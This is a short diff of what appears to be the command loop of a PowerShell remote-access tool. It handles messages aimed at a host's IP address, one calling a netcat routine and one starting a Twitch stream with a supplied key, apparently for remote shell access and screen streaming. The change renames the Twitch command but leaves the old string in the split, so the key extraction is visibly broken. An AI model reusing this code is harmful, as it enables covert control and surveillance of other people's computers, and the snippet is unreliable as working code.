@@ -635,7 +635,7 @@ While ($DoNotExit)  {
       "/nc $ipV4"{
         netcat
       }
-      "/twitch $ipV4 *"{
+      "/starttwitch $ipV4 *"{
         $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
         twitch $STREAM_KEY
       }
